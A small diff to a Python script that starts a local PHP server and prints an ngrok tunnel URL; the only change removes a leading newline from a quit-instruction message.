@@ -43,7 +43,7 @@ def runNgrok():
     while ngrok_url == '':
         ngrok_url = getoutput(check)
     print(green('\n [*] Ngrok URL: %s' % ngrok_url))
-    print(yellow('\n [^] Press Ctrl+C or VolDown+C(android) to quit'))
+    print(yellow(' [^] Press Ctrl+C or VolDown+C(android) to quit'))
 
 def runServer():
     system("cd base/Server/www/ && php -S 127.0.0.1:1449 > /dev/null 2>&1 &")
